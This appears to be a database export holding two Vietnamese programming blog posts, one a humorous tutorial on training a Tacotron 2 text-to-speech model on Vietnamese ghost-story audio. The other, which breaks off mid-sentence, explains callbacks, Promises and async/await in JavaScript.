audio_extract_name = '{}/{}_{}_{}.wav'.format(audio_outdir, audio_name, start_ms, end_ms)\n        text = str(sub.text)\n        # Extract file\n        extract = song[start_ms:end_ms]\n        # Saving \n        extract.export(audio_extract_name, format="wav")\n        # Write to csv file\n        fd.write('{}|{}\\n'.format(audio_extract_name, text))\n```\n\n## Chuẩn hoá dữ liệu \n\nSau khi đx chuẩn bị xong dữ liệu giờ các cháu phải làm đến bước tiếp theo đó là chuẩn hoá các cháu nhé. Việc chuẩn hoá này bao gồm chuẩn hoá text và chuẩn hoá audio.\n### Chuẩn hoá text \n Về chuẩn hoá text có một số bước như convert từ chữ hoa về chữ thường, convert từ số sang chữ,  convert thời gian, ngày tháng sang chữ ... Bước này gồm một vài hàm như sau, các cháu có thể tham khảo hoặc custom thêm các hàm khác nữa nhé.\n\n ```python \n import re \nfrom num2words import num2words\nfrom unicodedata import normalize\n\ndef vi_num2words(num):\n    return num2words(num, lang='vi')\n\ndef convert_time_to_text(time_string):\n    # Support only hh:mm format\n    try:\n        h, m = time_string.split(":")\n        time_string = vi_num2words(int(h)) + " giờ " + vi_num2words(int(m)) + " phút" \n        return time_string\n    except:\n        return None\n\ndef replace_time(text):\n    # Define regex to time hh:mm\n    result = re.findall(r'\\d{1,2}:\\d{1,2}|', text)\n    match_list = list(filter(lambda x : len(x), result))\n\n    for match in match_list:\n        if convert_time_to_text(match):\n            text = text.replace(match, convert_time_to_text(match))\n    return text\n\ndef replace_number(text):\n    return re.sub('(?P<id>\\d+)', lambda m: vi_num2words(int(m.group('id'))), text)\n\ndef normalize_text(text):\n    text = normalize("NFC", text)\n    text = text.lower()\n    text = replace_time(text)\n    text = replace_number(text)\n    return text\n ```\n\n Sau khi các cháu chạy hàm **normalize_text** thì sẽ có kết quả của chuỗi được chuẩn hoá. Tiếp theo chúng ta sẽ đến một bước khá quan trọng đó là chuẩn hoá audio. Ông nhắc lại là đây là bước khá quan trọng nhé. Cháu nào làm sai lúc sau không training được thì đừng kêu nha \n\n### Chuẩn hoá audio \n\nVề cơ bản thì muốn dùng được framework **Tacotron 2** dưới đây thì các bạn cần phải thực hiện chuẩn hoá audio về theo format giống như tập dữ liệu tiếng anh. Có một số đặc điểm như:\n\n* Sampling rate: 22050\n* Data format WAV Mono \n* Decoding PCMS16LE\n\nCác cháu có thể sử dụng FFMPEG để thực hiện các bước chuẩn hoá này nhé. \n\n# Tìm hiểu về Tacotron 2\n\nCác cháu thân mến, vậy ông cháu ta đã vừa chuẩn bị xong dữ liệu nào rồi phải không. Tiếp theo chúng ta sẽ đến phần chế biến các dữ liệu đó thành một món ngon **siu siu to khổng lồ** luôn. Nhưng trước hết chúng ta cần phải hiểu lý thuyết cái đã nhé. Mô hình mà chúng ta sử dụng cho bài toán này đó là mô hình **Tacotron2**. Để hiểu rõ hơn về mô hình này chúng ta sẽ lướt qua một vài khái niệm trong đó nhé:\n\n## Tacotron 2 là gì?\n\nCác cháu ạ, **Tacotron 2** chính là một mạng nơ ron nhân tạo được phát minh ra bởi đồng chí Google vào cuối năm 2018 để giải quyết vấn đề tổng hợp giọng nói với một chất lượng có thể coi là **bá cháy** nhất trong những Framework được public hiện tại về Text To Speech. Để hiểu được độ bá cháy của nó thế nào ông mời các cháu xem qua chính các kết quả của nhóm nghiên cứu sau khi thử nghiệm trên tập dữ liệu của tiếng anh tại [đây](https://google.github.io/tacotron/publications/tacotron2/). Và mô hình chung của **Tacotron 2** có thể được minh hoạ trong sơ đồ sau:\n\n![](https://miro.medium.com/max/1248/1*fOfgv91uW0osDqddnJjdww.jpeg)\n\nNhìn sơ đồ trên chắc hẳn nhiều cháu không hiểu phải không. Để ông túm váy lại cho các cháu dễ hiểu nhé:\n\n> Túm váy lại, kiến trúc **tacontron 2** sử dụng một mô hình **Sequence to Sequence** rất thông dụng trong các bài toán dịch tự động hay image captioning. Tuy nhiên đầu vào của chúng ta là một chuỗi các kí tự và đầu ra tương ứng là một chuỗi các features (ở đây là mel spectrogram) nhưng features này có đặc điểm là nó không chỉ biểu diễn được độ chính xác của phát âm của các từ mà còn biểu diễn được nhiều sự tính chất khác của âm thanh con người như âm lượng, tốc độ và ngữ điệu. Để làm được điều này người ta sử dụng một cơ chế đó là **‘Location sensitive attention**. Kiến trúc này ông sẽ giải thích kĩ hơn trong phần tiếp theo. Sau đó các đặc trưng này được đưa vào một mạng vocoder như Wavenet để chuyển từ mel spectrogram sang spectrogram và chuyển thành audio. \n\nĐại ý kiến trúc của chúng ta là như vậy. **Tacotron 2** sẽ bao gồm 2 phần đó là Seq2Seq để chuyển từ chuỗi các kí tự sang đặc trưng mel spectrogram và một phần nữa để chuyển mel spectrogram đó thành audio thông qua một wave-net model.  Giờ chúng ta đi tìm hiểu chi tiết từng phần một các cháu nhé \n\n## Mạng convert Text sang Mel Spectrogram\n\nNhư ông đã trình bày phía trên thì dây chính là phần mà chúng ta sẽ xem xét đầu tiên, làm sao chuyển từ mỗi chuỗi các kí tự sáng một chuỗi các đặc trưng **mel spectrograms**. Có một điểm thú vị của **Tacotron 2** đó là các cháu có thể training độc lập hai mô hình Seq2seq này với mô hình Wavenet phía sau nên hôm nay chúng ta sẽ đi làm rõ về phần đầu tiên nhé.  Mô hình này là một mạng nơ ron kết hợp của 3 thành phần là **encoder-attention-decoder** trong đó sử dụng cơ chế  **Location sensitive attention** với mục đích đã nói phía trên. Sơ đồ chung của nó có thể diễn tả trong  hình bên dưới. Giờ chúng ta cùng tìm hiểu chi tiết về các phần này nhé \n\n![](https://analyticsindiamag.com/wp-content/uploads/2018/01/Master.png)\n\n### Encoder \nPhần đầu tiên là một **Encoder** chuyển đổi chuỗi ký tự thành vector word embeding. Các đặc trưng này sau đó được sử dụng để bộ **Decoder** dự đoán các phổ. Trong trường hợp bài toán của chúng ta cần phải sử dụng tập từ tiếng Việt nên các kí tự mà chúng ta sử dụng cũng là tập các kí tự của tiếng Việt nhé các cháu. Trong sơ đồ trên thì Encoder chính là thành phần màu xanh dương phía bên trái, nó bao gồm các mạng con như sau:\n\n* **Mạng Character Embeding** sử dụng để mã hoá kí tự, kích thước của mạng này tuỳ thuộc vào số lượng từ mà chúng ta config trong từ điển \n* **Mạng 3 Conv** sau khi kết quả đầu ra của mạng embeding sẽ được đưa vào 3 lớp Convolution 1D và mỗi lớp trong số đó chứa 512 filters kích thước 5 x 1 và sau cùng là lớp **Batch Normalization** và hàm kích hoạt **ReLU**\n* **Mạng LSTM** Đầu ra của lớp tích chập cuối cùng được đưa vào một mạng LSTM hai chiều chứa 512 units (256 units cho mỗi chiều) để sinh ra các đặc trưng được encoded. \n\n### Attention \n\nMục đích của lớp Attention (màu xám trên hình phía trên) là giúp cho mô hình focus vào không chỉ các đặc trưng ở các step trước đó mà còn là cả đặc trưng tại vị trí hiện tại.  Giải thích nhanh một chút nhé. Giả sử chúng ta có dữ liệu $x = {x1,x2,x3….xN}$ sau khi di qua mạng encoder phía trên cho ra một chuỗi kết quả $h = {h1,h2,h3….hN}$. Một vector $A(i) = Attention( s(i-1), A(i-1), h )$ được gọi là **alignment** trong đó thì $s(i-1)$ là trạng thái decoding trước đó và $A(i-1$ là **alignment** của step trước đó. \n\nHàm **Attention** thường được tính toán bằng cách tính điểm riêng các thành phần trong **h** một cách độc lập sau đó normalize kết quả. \n\nChúng ta định nghĩa hai hàm đặc trưng sau:\n\n$$G(i) = A(i,0) h(0) + A(i,1) h(1) + ……. + A(i,N) h(N)$$\n\nvà \n\n$$Y(i) = Generate ( s(i-1), G(i) )$$\n\ncuối cùng trạng thái tiếp theo được tính toán dựa vào các hàm trên với cơ chế **Attention** \n\n$$s(i) = LSTM ( s(i-1), G(i), Y(i) )$$\n\nPhần tiếp theo chúng ta sẽ cùng tìm hiểu về thành phần cuối cùng (màu da cam) được gọi là **Decoder**\n\n### Decoder \n\nMục đích của mạng decoder là sinh ra mel spectrogram từ kết quả đầu ra của bước trước. Đầu tiên phải xét đến mạng pre-net với **2 fully connected layers** gồm 256 units và hàm kích hoạt ReLU. Đầu ra của mạng pre-net được concatnate với đầu ra của mạng attention và được đưa qua 2 lớp LSTM với 1024 units. Cuối cùng để predict ra mel spectrogram thì vector đầu ra được đưa qua 5 layers convolution được gọi là post-net. Chắc là lý thuyết đến như vậy là đủ rồi các cháu nhỉ. Giờ chúng ta bắt tay ngay vào phần thực hành thôi nhé.\n\n# Training mô hình \n\nRất khuyến khích nếu cháu nào đọc hết phần lý thuyết bên trên nhưng cũng đã đến lúc chúng ta cần phải đi sâu vào thực tế hơn một chút rồi đó. Ở đây để cho dễ dàng chúng ta sẽ sử dụng **Pytorch** để training mô hình Tacotron 2 này. Một trong những repo implêmnt mô hình này tuyệt vời nhất đó là [NVIDIA/tacontron-2](https://github.com/NVIDIA/tacotron2). Trong đó chúng ta cùng đi sâu phân tích cách họ implement mô hình nhé. Các cháu mở file [model.py](https://github.com/NVIDIA/tacotron2/blob/master/model.py) ra sẽ thấy toàn bộ các phần code implement đến mô hình. Ông rất khuyến khích các cháu thử dành ra một vài giờ để ngồi đọc code của họ xem họ xử lý ra sao. Tất cả các phần họ sử dụng đã được trình bày ở phần lý thuyết phía trên nhưng có vẻ như việc đọc code sẽ dễ hiểu hơn rất nhiều so với việc đọc lý thuyết phải không các cháu. \n\n```python \nclass Tacotron2(nn.Module):\n    def __init__(self, hparams):\n        super(Tacotron2, self).__init__()\n        self.mask_padding = hparams.mask_padding\n        self.fp16_run = hparams.fp16_run\n        self.n_mel_channels = hparams.n_mel_channels\n        self.n_frames_per_step = hparams.n_frames_per_step\n        self.embedding = nn.Embedding(\n            hparams.n_symbols, hparams.symbols_embedding_dim)\n        std = sqrt(2.0 / (hparams.n_symbols + hparams.symbols_embedding_dim))\n        val = sqrt(3.0) * std  # uniform bounds for std\n        self.embedding.weight.data.uniform_(-val, val)\n        self.encoder = Encoder(hparams)\n        self.decoder = Decoder(hparams)\n        self.postnet = Postnet(hparams)\n\n    def parse_batch(self, batch):\n        text_padded, input_lengths, mel_padded, gate_padded, \\\n            output_lengths = batch\n        text_padded = to_gpu(text_padded).long()\n        input_lengths = to_gpu(input_lengths).long()\n        max_len = torch.max(input_lengths.data).item()\n        mel_padded = to_gpu(mel_padded).float()\n        gate_padded = to_gpu(gate_padded).float()\n        output_lengths = to_gpu(output_lengths).long()\n\n        return (\n            (text_padded, input_lengths, mel_padded, max_len, output_lengths),\n            (mel_padded, gate_padded))\n\n    def parse_output(self, outputs, output_lengths=None):\n        if self.mask_padding and output_lengths is not None:\n            mask = ~get_mask_from_lengths(output_lengths)\n            mask = mask.expand(self.n_mel_channels, mask.size(0), mask.size(1))\n            mask = mask.permute(1, 0, 2)\n\n            outputs[0].data.masked_fill_(mask, 0.0)\n            outputs[1].data.masked_fill_(mask, 0.0)\n            outputs[2].data.masked_fill_(mask[:, 0, :], 1e3)  # gate energies\n\n        return outputs\n\n    def forward(self, inputs):\n        text_inputs, text_lengths, mels, max_len, output_lengths = inputs\n        text_lengths, output_lengths = text_lengths.data, output_lengths.data\n\n        embedded_inputs = self.embedding(text_inputs).transpose(1, 2)\n\n        encoder_outputs = self.encoder(embedded_inputs, text_lengths)\n\n        mel_outputs, gate_outputs, alignments = self.decoder(\n            encoder_outputs, mels, memory_lengths=text_lengths)\n\n        mel_outputs_postnet = self.postnet(mel_outputs)\n        mel_outputs_postnet = mel_outputs + mel_outputs_postnet\n\n        return self.parse_output(\n            [mel_outputs, mel_outputs_postnet, gate_outputs, alignments],\n            output_lengths)\n```\n\n## Tạo dữ liệu training và testing \n\nViệc tiếp theo chúng ta cần thực hiện đó là phân chia dữ liệu thành hai tập training và testing. Bước này khá đơn giản, chúng ta sẽ lấy ngẫu nhiên khoảng 80% của dữ liệu để làm dữ liệu training và 20% còn lại để làm dữ liệu testing. Các cháu phân chia rồi ghi kết quả ra file .txt theo format từng dòng là \n\n```python \nabsolute_audio_path | coressponding text\n```\n\nĐể làm được điều đó các cháu vào trong thư mục data đã normalize ở phần đầu, thực hiện như sau:\n\n^ Mở file `output.csv` và shuffle random dữ liệu. Việc này khiến cho dữ liệu của chúng ta được trộn lẫn một cách random trước khi chia training và testing \n\n```python \n# Training testing split\nimport pandas as pd\n\ndata = pd.read_csv('output.csv', sep='|', header=-1)\n\n# Suffle\ndata = data.sample(frac=1)\n```\n\n* Chia training và testing file:\n\n```python \nimport os\n\ntrain_ratio = 0.8\ntrain_index = int(train_ratio * len(data))\n\nwith open('training.txt', 'w') as fd:\n    for i, fname in enumerate(data[0][:train_index]):\n        fd.write('{}|{}\\n'.format(os.path.join(os.getcwd(), fname), data[1][i]))\n\nwith open('testing.txt', 'w') as fd:\n    for i, fname in enumerate(data[0][train_index:]):\n        fd.write('{}|{}\\n'.format(os.path.join(os.getcwd(), fname), data[1][i]))\n```\n\nSau đó chúng ta sẽ có hai file trong cùng thư mục để thực hiện cho việc training sau này.\n## Tạo characters set cho tiếng Việt\n\nĐây là bước rất quan trọng. Các cháu vào trong thư mục 'text/symbols.py' và thay thế dòng sau:\n\n```python \n_letters  = '0123456789aáảàãạâấẩầẫậăắẳằẵặbcdđeéẻèẽẹêếểềễệfghiíỉìĩịjklmnoóỏòõọôốổồỗộơớởờỡợpqrstuúủùũụưứửừữựvwxyýỷỳỹỵz'\n```\n\nĐây chính là tập các kí tự tiếng Việt sau khi đã tiến hành normalize text. Các cháu có thể bổ sung thêm các kí tự khác nếu trong tập dữ liệu có thêm các loại kí tự đặc biệt. Nhưng với các trường hợp phổ thông của tiếng Việt thì như vậy là đủ rồi. \n\n## Cấu hình tham số \n\nCác tham số của mô hình **Tacotron2** được config tại file [hparams.py](https://github.com/NVIDIA/tacotron2/blob/master/hparams.py) các cháu không nên thay đổi các tham số mặc định của mô hình. Chỉ thay đổi một vài thông số cơ bản sau:\n\n* Các cháu thay dòng \n\n```python \nignore_layers=['embedding.weight'],\n``` \nthành \n```python \nignore_layers=[''],\n```\nDo chúng ta không sử dụng **Transfer Learning** mà sẽ training lại từ đầu trên tập dữ liệu truyện ma tiếng Việt luôn \n\n* Các cháu thay đổi đường dẫn đến hai file đã sinh ra ở phần tạo dữ liệu training và testing. Nhớ là dùng đường dẫn tuyệt đối nhé \n\n```python \ntraining_files='filelists/ljs_audio_text_train_filelist.txt',\nvalidation_files='filelists/ljs_audio_text_val_filelist.txt',\n```\n* Các cháu đổi lại tham số **text_cleaners** từ **english_cleaners** thành **basic_cleaners** để nó nhận từ điển tiếng Việt mà chúng ta đã config phía bên trên \n* Các cháu đổi lại batct_size nếu như máy của các cháu không đủ tài nguyên GPU. \n\nOK vậy là bước cấu hình đã xong, giờ chúng ta bắt đầu vào training thôi nhé.\n\n## Training mô hình:\n\nSau khi tiến hành đầy đủ các bước trên các cháu tiến hành training bằng câu lệnh đơn giản sau:\n\n```python \n python train.py -o output_vi -l logs\n```\n\nThời gian training thông thường mất khá lâu (khoảng 1 ngày với máy tính GPU 2080 Ti / 5h dữ liệu) thì mới có thể thấy kết quả ở mức chấp nhận được. Các cháu cứ bình tĩnh. Không có điều gì là dễ dàng cả đâu các cháu ạ. Nếu cháu nào lười training thì ông có sẵn pretrained model cho các cháu đây. Các cháu có thể download thử [tại đây](https://drive.google.com/file/d/1C7579RXn-A1jwOBIqJ0KFunD1Htj-1Ro/view?usp=sharing) nhé. Ông mới training với khoảng 13h dữ liệu và khoảng 2 ngày training thôi các cháu nhé. \n\n# Thử nghiệm mô hình\n\nSau khi đã training được mô hình các cháu có thể mở file inference.py ra để thử nghiệm mô hình này. Lưu ý rằng các cháu chưa động gì đến phần Wavenet phía sau nên trong phần vocder các cháu để nguyên nhé, chỉ thay các tham số của mô hình Tacotron2 mà chúng ta vừa training xong thôi nhé. Các cháu có thể nghe thử mấy câu nha:\n\n> Các cháu của ông ơi, hôm nay các cháu có khỏe không  [nghe thử tại đây](https://drive.google.com/file/d/1dRaAdqSsl-gYjOQR2FUaCotvecaQqrit/view?usp=sharing)\n\n# Hậu xử lý với nhiều câu\nKết quả trên là thử nghiệm với một câu đơn. Đối với một đoạn văn bản dài chúng ta cần có một vài bước hậu xử lý nữa. Ở đây chúng ta chưa bàn quá sâu về bước này, chỉ đơn giản là ghép các câu lại với nhau và thêm các khoảng ngắt nghỉ thích hợp với dấu chấm và dấu phất thôi. Các cháu có thể tham khảo hai hàm sau \n\n```python \nimport re\n\ndef tts(text):    \n    text = normalize("NFC", text).lower()\n    sequence = np.array(text_to_sequence(text, ['basic_cleaners']))[None, :]\n    sequence = torch.autograd.Variable(\n        torch.from_numpy(sequence)).cuda().long()\n\n    with torch.no_grad():\n        mel_outputs, mel_outputs_postnet, _, alignments = model.inference(sequence)\n        audio = waveglow.infer(mel_outputs_postnet, sigma=0.666)\n    audio_denoised = denoiser(audio, strength=0.005)[:, 0].cpu().numpy()\n\n    return audio_denoised\n\ndef pts(para):\n    audio = np.zeros((1,0))\n    sentence_ls = para.split(".")\n\n    for sen in sentence_ls:\n        sub_stn_ls = re.split(",|;|-|:", sen)\n        for sub_stn in sub_stn_ls:\n            audio = np.append(audio, tts(sub_stn), axis=1)\n            audio = np.append(audio, np.zeros((1, int(hparams.sampling_rate/8)), dtype=np.uint8) , axis=1)\n        audio = np.append(audio, np.zeros((1, int(hparams.sampling_rate/4)), dtype=np.uint8) , axis=1)\n    return audio\n```\nĐể sinh ra một audio dài các cháu sử dụng lệnh \n\n```python \npts("Câu gì đó, gì đó. Câu gì đó nữa, câu gì đó, gì gì đó. Chả biết viết câu gì đó nữa, tóm lại là câu gì đó")\n```\n\nVà kết quả các cháu có thể thấy ở [đây](https://drive.google.com/file/d/1s6YubHGGvysl1obgQlyGeNaiJAItbaCu/view?usp=sharing)\n# Kết quả cuối cùng\nMời các cháu nghe thử một vài câu nha. \n> Xin chào các cháu, các cháu nhớ cho ông một like để ủng hộ ông nha. Ông đang rất là vui, hôm nay ông sẽ hướng dẫn các cháu làm món bánh siêu to khổng lồ nhé\n [nghe thử tại đây](https://drive.google.com/file/d/1jqwMPjWzZn-zhdXKdF-HE_o8xGahNxvU/view?usp=sharing)\n\n> Ra đường sợ nhất công nông. Về nhà sợ nhất vợ không nói gì  [nghe thử tại đây](https://drive.google.com/file/d/1_5kdZaFEhLRO5u4gMAVgs0D2rqTe9PPk/view?usp=sharing)\n\nCòn đọc truyện ma siêu to khổng lồ luôn nhé các cháu.\n\n> Vì lòng tham mà bọn chúng đã cắt mái tóc của cô gái đã chết đem bán ngoài tiệm làm tóc giả. Từ đây nhiều điều ma quái đã xuất hiện trong ngôi nhà. Cô chị là một kẻ ăn chơi, vào một ngày nọ cô ta nhốt cô em gái của mình vào nhà, ngôi nhà bị cháy nhưng kì lạ thay người chết là người chị chứ không phải người em. Cô chị không hề biết bản thân mình đã chết. Cho đến khi cô em gặp được bố mẹ mình và khóc kêu rằng chị gái đã chết   [nghe thử tại đây](https://drive.google.com/file/d/152j7pi41RFTEEvb-P7jRgkaZKbuVtdbm/view?usp=sharing)\n# Tổng kết\n\nVậy là hôm nay ông đã hướng dẫn các cháu sơ qua các bước để làm một mô hình speech to text. Kết quả bước đầu như vậy là khá tốt nhưng vẫn còn cần phải cải tiến nhiều thứ trong phần  hậu xử lý cũng như làm dữ liệu cho chuẩn xác hơn. Rất hi vọng sẽ là món quà cho các cháu trong mùa hè nóng nực này. Thân ái chào tạm biệt các cháu	Xin chào các cháu, chắc hẳn có rất nhiều cháu, nhất là các cháu đam mê truyện ma kinh dị hẳn không còn lạ lẫm gì với những audio truyện ma nổi tiếng của các bác Nguyễn Ngọc Ngạn, Đình Soạn hay bác Hồng Nhung. Tuy nhiên các ông đấy do là phải thường xuyên đọc nhiều nên cũng mỏi mồm lắm các cháu ạ. Thế nên là khi các cháu muốn nghe một truyện mới cũng phải chờ các ông ấy chữa mồm thì mới hi vọng ...	{https://images.viblo.asia/2a9912e4-97df-4bf7-9bdd-fce4f20e4142.png,https://images.viblo.asia/a2df097a-7d15-4d42-b858-038df5deed29.png,https://analyticsindiamag.com/wp-content/uploads/2018/01/Master.png}	1	Ông Toằn Vi Lốc -  Ứng dụng Deep Learning  tự động sinh ra series audio truyện ma siêu to khổng lồ	{tacotron2,deep-learning}	0	f	2022-12-18 15:33:37.502+00	2022-12-18 15:33:37.502+00
31951	## I. Đồng bộ và bất đồng bộ\n###     1) Khái niệm \n* Synchronous(đồng bộ) là một quy trình xử lý các công việc theo một thứ tự đã được lập sẵn. Công việc sau được bắt đầu thực hiện chỉ khi công việc thứ nhất hoàn thành. Quá trình đồng bộ là một quá trình rất phổ biến trong thực tế. Ví dụ dây chuyền sản xuất sản phẩm trong các nhà máy, hay lộ trình học tập của một học sinh từ lớp 1 đến lớp 12, …\n  Trong lập trình, một chương trình đồng bộ là một chương trình được thực hiện theo từng câu lệnh từ trên xuống dưới, từ trái qua phải, câu lệnh sau được thực hiện chỉ khi câu lệnh trước đã hoàn thành. Đa số các ngôn ngữ biên dịch đều tuân theo quy tắc lập trình đồng bộ ví dụ C++, Java, ...Vì thế chỉ cần biên dịch một câu lệnh sai là cả chương trình sẽ dừng lại và báo lỗi.\n\n*  Ngược lại, với Asynchronous(bất đồng bộ), nhiều công việc có thể được thực hiện cùng lúc. Và nếu công việc thứ hai kết thúc trước, nó có thể sẽ cho ra kết quả trước cả câu lệnh thứ nhất. Vì thế, đôi khi kết quả của các câu lệnh sẽ không trả về đúng theo đúng thứ tự như trực quan của nó.\n\n### 2) So sánh ưu nhược điểm của lập trình đồng bộ và bất đồng bộ\n* Lập trình đồng bộ có ưu điểm là chương trình sẽ chạy theo đúng thứ tự từ trên xuống, và sẽ phát dừng lại ngay khi gặp một câu lệnh lỗi. Điều này sẽ khiến chương trình dễ kiểm soát và dễ phát hiện ra lỗi hơn. \n* Lập trình đồng bộ cũng có một nhược điểm là hiệu suất chương trình sẽ chậm. Có rất nhiều câu lệnh cần phải thao tác với các dữ liệu bên ngoài nên nó cần có một thời gian chờ để nhận được dữ liệu trước khi hoạt động bình thường. Như thế thời gian thực hiện của chương trình sẽ bằng tổng thời gian chờ của các câu lệnh và thời gian hoạt động bình thường của các câu lệnh đó. Ở một số ngôn ngữ đồng bộ đa luồng, vấn đề này được xử lý bằng cách bổ sung một luồng để thực hiện các câu lệnh khác. Luồng ban đầu sẽ chờ kết quả của luồng bổ sung, sau đó hai luồng sẽ đồng bộ hóa để kết hợp lại kết quả của chúng.\n\n* Lập trình không đồng bộ có cách khác để giải quyết vấn đề trên. Chúng cho phép các hành động  được thực hiện cùng lúc. Do đó, sẽ tối ưu được thời gian chờ của các câu lệnh vì các câu lệnh sẽ được “chờ cùng nhau”. Ở ví dụ sau, câu lệnh 1 và 2 đã “cùng nhau chờ” 0,4s, do đó thời gian thực hiện chương trình giảm được 0,4s.\n![](https://images.viblo.asia/2bd68baa-d7db-4b81-86f1-5280fb89eccc.png)\n \n\tỞ hình sau, đường màu đỏ thể hiện thời gian chờ của một câu lệnh, đường màu xanh dày thể hiện thời gian thực hiện bình thường của lệnh đó.\n![](https://images.viblo.asia/0f44c12e-bfa3-4904-8795-8a824ebf0dbb.png)\n\n*  Tuy nhiên, lập trình không đồng bộ cũng có nhược điểm. Do các câu lệnh không đồng bộ có thể sẽ không được thực hiện theo đúng thứ tự từ trên xuống theo quy trình nên đòi hỏi chúng ta cần có các kỹ thuật để kiểm soát chúng. Ví dụ cụ thể ở đoạn mã sau:\n```\nsetTimeout(()=>console.log(1),1000);\nconsole.log(2);\n```\nCâu lệnh thứ hai trả về kết quả trước câu lệnh thứ nhất\n##     II. Bất đồng bộ trong JavaScript\n   Javascript là ngôn ngữ lập trình bất đồng bộ và chỉ chạy trên một luồng. Sự bất đồng bộ trong javascript xuất hiện khi nó thao tác với các  WebAPI (ajax, setTimeout(), ... ). Khi một câu lệnh thao tác với WebAPI, nó sẽ mất một khoảng thời gian để chờ các  dữ liệu trả về từ WebAPI, do đó ở trong luồng chính của javascript, nó sẽ ở trong trạng thái chờ. Tuy nhiên chương trình sẽ không bỏ trống khoảng thời gian chờ đó, chương trình sẽ tiếp tục thực hiện các câu lệnh tiếp theo. Đó là lý do Javascript là ngôn ngữ bất đồng bộ.\n   Sau đây chúng ta sẽ tìm hiểu kĩ hơn về cách javascript hoạt động với các trường hợp bất đồng bộ.\n![](https://images.viblo.asia/4f5918b4-39b4-4887-807c-ac734fa0061e.png)\n   Một câu lệnh trong javascript khi được thực hiện nó phải trải qua sự kiểm soát các các đối tượng: Timer, Message Queue,  Event Loop, CallStack. Đầu tiên, nếu một câu lệnh được gọi thao tác với WebAPI, nó sẽ được chuyển đến hàng đợi Timer. Sau khi hết thời gian chờ nó sẽ được chuyển đến Message Queue. Call Stack là ngăn xếp rất quen thuộc trong lập trình. Khi một hàm được gọi, hàm đó được thêm vào ngăn xếp và hàm đó sẽ được lấy ra khỏi ngăn xếp khi hàm đó thực thiện xong. Event Loop sẽ kiểm tra khi nào trong Call Stack trống thì sẽ chuyển câu lệnh trong Message Queue vào trong Call Stack. \n## III. Xử lý bất đồng bộ trong JavaScript\n   Để làm cho các câu lệnh thực hiện theo đúng thứ tự của nó, chúng ta có 3 phương án giải quyết phổ biến : Call Back,  Promise, Asyn/Await\n###     1) Call Back\n   Call Back là một hàm được truyền vào một hàm khác với tư cách như một tham số của hàm đó. Ví dụ như\n  ```\n function nauGa(callback)\n       nauNuocSoi();\n      vatLongGa();\n      callback();\n}\n function luocGa(){\n      //\n}\n\n function nuongGa(){\n  //\n }\n nauGa(luocGa);\n nauGa(nuongGa);\n```\nỞ đoạn mã trên, chúng ta thấy rằng, hàm luocGa và nuongGa được dùng như tham số trong hàm nauGa\n   Với Javascript, một ngôn ngữ hướng sự kiện, call back được sử dụng rất nhiều khi xử lý các sự kiện, ví dụ như  \n   ```\n$('#button').click(function(){\n   alert("hê nô");\n   })\n```\n   Chúng ta có thể áp dụng call back để đồng bộ hóa các đoạn mã không đồng bộ. Ví dụ như ở đoạn mã trên. Nấu nước sôi cần một khoảng thời gian chờ nước sôi, chúng ta không phải làm gì. Ta có thể biểu diễn thời gian chờ này bằng hàm setTimeout() trong javascript. \n   ```\n function soCheGa(){\n      nauNuocSoi();\n      vatLongGa();\n}\n function nauNuocSoi(){\n      setTimeout(function(){\n        console.log("nau nuoc soi")\n      }, 1000)\n}\nfunction vatLongGa(){\n    console.log("vat long ga");\n}\nsoCheGa();\n```\n   \n   Và nếu như theo đúng cách chạy của Javascript thì hành động vặt lông gà sẽ được thực hiện trước hành động nấu nước sôi. (à, quên mất, nấu nước sôi là để nhúng gà vào vặt lông chứ không phải để luộc gà đâu nhé ;) ) .Mà nếu chúng ta vặt lông gà luôn mà không cần nhúng nước nóng thì tội cho bác gà quá. Vì thế để cho gà có thể ra đi thanh thản chúng ta cần đồng bộ hóa lại quy trình bằng callback như sau\n```\n    function soCheGa(callback){\n      nauNuocSoi(vatLongGa);\n    }\n     function nauNuocSoi(callback){\n      setTimeout(function(){\n        console.log("nau nuoc soi");\n        callback();\n      }, 1000)\n    }\n```\nTuy nhiên, Callback cũng có nhược điểm. Đó là khi chúng ta muốn nhiều hành động bất đồng bộ thực hiện theo đúng thứ tự liên tiếp nhau, chúng ta phải gọi nhiều hàm callback lồng vào nhau nhiều lần, gây ra đoạn code rất khó kiểm soát và không tối ưu. Đây gọi là tình trạng Callback Hell. Ví dụ như muốn in các số từ 1 đến 10, mà mỗi hành động in đều là một hàm bất đồng bộ\n```\nfunction printNumber(number, callback){\n  setTimeout(\n    () => {\n      console.log(number)\n      callback()\n    },\n    Math.floor(Math.random() * 100) + 1\n  )\n}\n\nfunction printAll(){\n  printNumber(1, function(){\n    printNumber(2, function(){\n      printNumber(3, function(){\n        printNumber(4, function(){\n          printNumber(5, function(){\n            printNumber(6, function(){\n              printNumber(7, function(){\n                printNumber(8, function(){\n                  printNumber(9, function(){\n                    printNumber(10, function(){\n\n                    })\n                  })\n                })\n              })\n            })\n          })\n        })\n      })\n    })\n  })\n}\n```\n\n\n### 2) Promise\n   Promise là một đối tượng bao hàm một hàm chứa các đoạn code không đồng bộ. Hàm này chứa 2 tham số là hai hàm callback để giải quyết sau khi mã đồng bộ thực hiện thành công hay thất bại. Promise cung cấp cho ta hai phương thức xử lý sau khi đoạn mã bất đồng bộ thực hiện thành công hoặc thất bại. Hàm then() dùng để xử lý sau khi mã bất đồng bộ được thực hiện thành công và hàm catch() dùng để xử lý sau khi mã bất đồng bộ thực hiện thất bại\n  ```\n function printNumber(number){\n      return new Promise((resolve, reject) => {\n        setTimeout(\n          () => {\n          if(number<0){\n           reject(); \n           }else{\n               console.log(number);\n               resolve();\n           }\n          }, \n        1000\n        )\n      })\n}\nprintNumber(1)\n.then(()=>printNumber(2))\n.reject(()=>console.log("number < 0"))\n```\nPhương thức then có thể thực thi một hàm, một Promise hay một đối tượng. Nếu chúng ta dùng then để trả về một Promise thì ta có thể tận dụng để xử lý tình trạng Callback Hell\n```\nprintNumber(1)\n.then(()=>printNumber(2))\n.then(()=>printNumber(3))\n.then(()=>printNumber(4))\n.then(()=>printNumber(5))\n.then(()=>printNumber(6))\n.then(()=>printNumber(7))\n.then(()=>printNumber(8))\n.reject(()=>console.log("number < 0"))\n```\nTuy nhiên, dù Promise đã giải quyết được vấn đề Callback Hell, nhưng chúng ta có thể thấy, đoạn mã vẫn chưa thực sự rõ ràng và dễ hiểu. Trong phương thức chúng ta vẫn phải truyền vào một hàm, mà hàm đó trả về một hàm khác có giá trị trả về là 1 Promise. Chúng ta tạm gọi đây là tình trạng Promise Hell. \n### 3) Asyn/Await\nAsync / Await là một tính năng ngôn ngữ là một phần của tiêu chuẩn ES8. Từ khóa Async để khai báo rằng hàm này sẽ xử lý các hàm bất đồng bộ, nó sẽ chờ kết quả 